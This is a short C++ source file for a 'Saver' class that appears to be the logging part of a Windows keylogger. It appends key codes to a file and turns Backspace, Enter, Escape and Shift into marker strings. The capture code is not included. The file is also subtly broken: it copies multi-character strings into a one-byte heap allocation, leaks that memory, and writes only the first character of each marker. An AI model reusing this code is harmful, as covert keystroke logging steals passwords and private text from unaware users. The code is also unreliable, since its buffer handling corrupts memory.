#include<iostream>
#include<Windows.h>
#include "Saver.h"

Saver::Saver(const char* filename, bool debug=false) {
	isdebug = debug;
	fopen_s(&file, filename, "a+");
}

Saver::~Saver() {
	fclose(file);
}

int Saver::Save(int& _key) {
	char* str = new char;
	switch (_key)
	{
	case VK_BACK:
		strcpy_s(str, strlen(BKSP)+1, BKSP);
		break;
	case VK_RETURN:
		strcpy_s(str, strlen(ENTR)+1, ENTR);
		break;
	case VK_ESCAPE:
		strcpy_s(str, strlen(ESCP)+1, ESCP);
		break;
	case VK_SHIFT:
		strcpy_s(str, strlen(SHFT)+1, SHFT);
		break;
	default:
		*str = _key;
		break;
	}

	if (!write_to_file(str)) {
		std::cout << "Error opening file";
		exit(EXIT_FAILURE);
	}

	return 0;
}


bool Saver::write_to_file(char* str) {
	if (isdebug) {
		std::cout << "Written " << *str << " to file.\n";
	}
	fprintf(file, "%c", *str); 
	return true;
}
